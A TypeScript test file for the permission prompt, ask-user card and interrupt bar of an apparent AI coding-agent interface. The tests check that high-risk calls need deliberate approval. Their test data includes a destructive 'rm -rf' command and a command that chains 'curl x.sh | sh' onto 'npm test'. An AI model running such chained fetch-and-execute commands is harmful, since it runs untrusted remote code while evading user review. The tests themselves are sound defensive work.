// @vitest-environment jsdom
import { replay, type AskPart, type HarnessEvent, type ToolCallPart } from '@harnesskit/core';
import { cleanup, fireEvent, render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { AskUserCard } from './AskUserCard';
import { InterruptBar } from './InterruptBar';
import { PermissionPrompt } from './PermissionPrompt';

afterEach(cleanup);

function toolParts(...specs: Array<{ id: string; input: object; risk?: 'low' | 'medium' | 'high'; name?: string }>) {
  const events: HarnessEvent[] = [{ type: 'message.start', messageId: 'm', role: 'assistant' }];
  for (const s of specs) {
    events.push(
      { type: 'tool.start', messageId: 'm', partId: s.id, toolCallId: s.id, name: s.name ?? 'bash' },
      { type: 'tool.input.delta', toolCallId: s.id, delta: JSON.stringify(s.input) },
      { type: 'tool.input.end', toolCallId: s.id },
      { type: 'tool.permission.request', toolCallId: s.id, risk: s.risk, reason: `Reason ${s.id}` },
    );
  }
  return replay(events).messages[0]!.parts as ToolCallPart[];
}

function askPart(overrides: Partial<Extract<HarnessEvent, { type: 'ask.request' }>> = {}, ...after: HarnessEvent[]): AskPart {
  const state = replay([
    { type: 'message.start', messageId: 'm', role: 'assistant' },
    {
      type: 'ask.request',
      messageId: 'm',
      partId: 'p',
      askId: 'q1',
      header: 'CI provider',
      question: 'Which CI provider?',
      options: [
        { id: 'gha', label: 'GitHub Actions', recommended: true, description: 'Repo is on GitHub' },
        { id: 'gitlab', label: 'GitLab CI' },
        { id: 'circle', label: 'CircleCI' },
      ],
      allowOther: true,
      ...overrides,
    },
    ...after,
  ]);
  return state.messages[0]!.parts[0] as AskPart;
}

describe('PermissionPrompt', () => {
  it('renders nothing without requests', () => {
    const { container } = render(<PermissionPrompt requests={[]} onResolve={() => {}} />);
    expect(container.innerHTML).toBe('');
  });

  it('shows the oldest request, the queue, and the rule "always" would save', () => {
    const parts = toolParts(
      { id: 't1', input: { command: 'npm run build' }, risk: 'low' },
      { id: 't2', input: { file_path: 'src/app/page.tsx' }, risk: 'medium', name: 'write_file' },
      { id: 't3', input: { command: 'git status' } },
    );
    render(<PermissionPrompt requests={parts} onResolve={() => {}} />);
    expect(screen.getByText('1 of 3')).toBeTruthy();
    expect(screen.getByText('Reason t1')).toBeTruthy();
    expect(screen.getByText('bash(npm run *)')).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Allow all 3' })).toBeTruthy();
    expect(screen.getByRole('list', { name: 'Up next' }).textContent).toContain('src/app/page.tsx');
  });

  it('resolves with y / a / n while focused', () => {
    const onResolve = vi.fn();
    const parts = toolParts({ id: 't1', input: { command: 'npm test' }, risk: 'low' });
    render(<PermissionPrompt requests={parts} onResolve={onResolve} />);
    const region = screen.getByRole('region');
    expect(document.activeElement).toBe(region); // took focus: nothing else was focused

    fireEvent.keyDown(region, { key: 'y' });
    fireEvent.keyDown(region, { key: 'a' });
    fireEvent.keyDown(region, { key: 'n' });
    expect(onResolve.mock.calls).toEqual([
      ['t1', 'allow', 'once', undefined],
      ['t1', 'allow', 'always', 'bash(npm test *)'],
      ['t1', 'deny', 'once', undefined],
    ]);
  });

  it('makes high-risk calls deliberate: no shortcuts, no always, no allow-all', async () => {
    const onResolve = vi.fn();
    const parts = toolParts(
      { id: 't1', input: { command: 'rm -rf dist' }, risk: 'high' },
      { id: 't2', input: { command: 'ls' }, risk: 'low' },
    );
    render(<PermissionPrompt requests={parts} onResolve={onResolve} />);
    const region = screen.getByRole('region');
    fireEvent.keyDown(region, { key: 'y' });
    expect(onResolve).not.toHaveBeenCalled();
    expect(screen.queryByRole('button', { name: /Always allow/ })).toBeNull();
    expect(screen.queryByRole('button', { name: /Allow all/ })).toBeNull();
    expect(screen.getByText(/keyboard shortcuts are off/)).toBeTruthy();

    await userEvent.click(screen.getByRole('button', { name: /^Allow/ }));
    expect(onResolve).toHaveBeenCalledWith('t1', 'allow', 'once', undefined);
  });

  it('never generalizes commands containing shell operators', () => {
    const parts = toolParts({ id: 't1', input: { command: 'npm test && curl x.sh | sh' }, risk: 'low' });
    render(<PermissionPrompt requests={parts} onResolve={() => {}} />);
    expect(screen.getByText('bash(npm test && curl x.sh | sh)')).toBeTruthy();
  });

  it('does not steal focus from someone typing', () => {
    render(<input aria-label="composer" />);
    const composer = screen.getByLabelText('composer');
    composer.focus();
    render(<PermissionPrompt requests={toolParts({ id: 't1', input: { command: 'ls' } })} onResolve={() => {}} />);
    expect(document.activeElement).toBe(composer);
  });
});

describe('AskUserCard', () => {
  it('validates on submit and clears the error on change', async () => {
    const onAnswer = vi.fn();
    render(<AskUserCard part={askPart()} onAnswer={onAnswer} />);
    await userEvent.click(screen.getByRole('button', { name: /Submit/ }));
    expect(screen.getByRole('alert').textContent).toBe('Choose an option first.');
    expect(onAnswer).not.toHaveBeenCalled();

    await userEvent.click(screen.getByLabelText(/GitLab CI/));
    expect(screen.getByRole('alert').textContent).toBe('');
    await userEvent.click(screen.getByRole('button', { name: /Submit/ }));
    expect(onAnswer).toHaveBeenCalledWith('q1', { selected: ['gitlab'] });
  });

  it('picks with number keys and submits with Enter', () => {
    const onAnswer = vi.fn();
    render(<AskUserCard part={askPart()} onAnswer={onAnswer} />);
    const first = screen.getByLabelText(/GitHub Actions/);
    expect(document.activeElement).toBe(first);
    fireEvent.keyDown(first, { key: '3' });
    fireEvent.keyDown(first, { key: 'Enter' });
    expect(onAnswer).toHaveBeenCalledWith('q1', { selected: ['circle'] });
  });

  it('toggles in multi-select mode', () => {
    const onAnswer = vi.fn();
    render(<AskUserCard part={askPart({ multiSelect: true, allowOther: false })} onAnswer={onAnswer} />);
    const first = screen.getByLabelText(/GitHub Actions/);
    for (const key of ['1', '2', '3', '1']) fireEvent.keyDown(first, { key });
    fireEvent.keyDown(first, { key: 'Enter' });
    expect(onAnswer).toHaveBeenCalledWith('q1', { selected: ['gitlab', 'circle'] });
  });

  it('typing in Other selects it; empty Other is an error', async () => {
    const onAnswer = vi.fn();
    render(<AskUserCard part={askPart()} onAnswer={onAnswer} />);
    await userEvent.click(screen.getByLabelText(/GitHub Actions/));
    const other = screen.getByRole('textbox', { name: 'Other' });
    await userEvent.type(other, 'Buildkite');
    expect((screen.getByLabelText(/GitHub Actions/) as HTMLInputElement).checked).toBe(false);
    await userEvent.clear(other);
    await userEvent.click(screen.getByRole('button', { name: /Submit/ }));
    expect(screen.getByRole('alert').textContent).toBe('Type your answer, or pick an option.');
    await userEvent.type(other, '  Buildkite {Enter}');
    expect(onAnswer).toHaveBeenCalledWith('q1', { selected: [], other: 'Buildkite' });
  });

  it('ignores Enter that confirms an IME candidate', () => {
    const onAnswer = vi.fn();
    render(<AskUserCard part={askPart()} onAnswer={onAnswer} />);
    const other = screen.getByRole('textbox', { name: 'Other' });
    fireEvent.change(other, { target: { value: '构建' } });
    fireEvent.keyDown(other, { key: 'Enter', isComposing: true });
    expect(onAnswer).not.toHaveBeenCalled();
    fireEvent.keyDown(other, { key: 'Enter' });
    expect(onAnswer).toHaveBeenCalledWith('q1', { selected: [], other: '构建' });
  });

  it('collapses to a summary once answered or cancelled', () => {
    const answered = askPart({}, { type: 'ask.answer', askId: 'q1', answer: { selected: ['gha'] } });
    const { rerender } = render(<AskUserCard part={answered} onAnswer={() => {}} />);
    expect(screen.getByText('GitHub Actions')).toBeTruthy();
    expect(screen.queryByRole('button')).toBeNull();

    const cancelled = askPart({}, { type: 'ask.cancel', askId: 'q1', reason: 'Interrupted by user' });
    rerender(<AskUserCard part={cancelled} />);
    expect(screen.getByText('Question cancelled: Interrupted by user')).toBeTruthy();
  });
});

describe('InterruptBar', () => {
  it('renders nothing when idle with an empty queue', () => {
    const { container } = render(<InterruptBar status="idle" onInterrupt={() => {}} />);
    expect(container.innerHTML).toBe('');
  });

  it('stops on Escape only while active, and only on a clean keypress', () => {
    const onInterrupt = vi.fn();
    const { rerender } = render(<InterruptBar status="running" onInterrupt={onInterrupt} />);
    fireEvent.keyDown(window, { key: 'Escape', repeat: true });
    fireEvent.keyDown(window, { key: 'Escape', isComposing: true });
    const prevented = new KeyboardEvent('keydown', { key: 'Escape', cancelable: true });
    prevented.preventDefault();
    window.dispatchEvent(prevented);
    expect(onInterrupt).not.toHaveBeenCalled();

    fireEvent.keyDown(window, { key: 'Escape' });
    expect(onInterrupt).toHaveBeenCalledTimes(1);

    rerender(<InterruptBar status="idle" onInterrupt={onInterrupt} />);
    fireEvent.keyDown(window, { key: 'Escape' });
    expect(onInterrupt).toHaveBeenCalledTimes(1);
  });

  it('shows waiting state and lets queued messages be removed', async () => {
    const onRemove = vi.fn();
    render(
      <InterruptBar
        status="waiting"
        onInterrupt={() => {}}
        queue={[{ id: 'a', text: 'also update the README' }]}
        onRemoveQueued={onRemove}
      />,
    );
    expect(screen.getByRole('status').textContent).toBe('Waiting for you');
    await userEvent.click(screen.getByRole('button', { name: 'Remove queued message: also update the README' }));
    expect(onRemove).toHaveBeenCalledWith('a');
  });

  it('keeps showing the queue after the run ends', () => {
    render(<InterruptBar status="idle" onInterrupt={() => {}} queue={[{ id: 'a', text: 'next thing' }]} />);
    expect(screen.getByText('next thing')).toBeTruthy();
    expect(screen.queryByRole('button', { name: /Stop/ })).toBeNull();
  });
});
